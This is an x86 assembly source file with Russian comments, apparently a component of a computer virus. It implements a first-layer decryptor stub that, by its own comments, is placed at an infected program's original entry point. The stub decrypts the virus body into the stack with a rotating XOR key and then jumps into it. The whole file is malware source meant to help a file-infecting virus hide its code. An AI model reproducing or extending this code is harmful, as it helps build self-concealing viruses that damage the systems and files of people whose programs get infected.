; ============================================================================
;	layer1_decoder.asm
;
;	код, помещаемый в ОЕР и расшифровывающий 1й уровень
;
; 	last change :: 28.10.2007
; ============================================================================


layer1_decoder:
LAYER1_DECODER_OFFSET	equ	$-virus_start

LAYER1_ROR_KEY_OFFSET	equ $-virus_start + 1
		mov			edx, 0					; сдвигаемый ключ
LAYER1_ESI_OFFSET		equ $-virus_start + 1
		mov			esi, 0					; откуда расшифровывать
LAYER1_INC_KEY_OFFSET	equ	$-virus_start + 1
		mov			ebx, 0					; ключ-инкремент
		sub			esp, VIRUS_SIZE			; выделить в стеке место
		mov			edi, esp				; расшифровывать - в стек
		cld
		mov			ecx, VIRUS_SIZE / 4		; сколько расшифровывать в DWORD'ах
layer1_decode_loop:
		; цикл расшифровки
		ror			edx, 7
		sub			edx, ebx
		sub			ebx, ecx
		lodsd
		xor			eax, edx
		stosd
		dec			ecx
		jnz			layer1_decode_loop

		; прыгнуть в расшифрованный код
		push		esp						
		DB			0c3h				; ret
		
LAYER1_DECODER_SIZE		equ $-layer1_decoder
OEP_CODE_SIZE			equ	LAYER1_DECODER_SIZE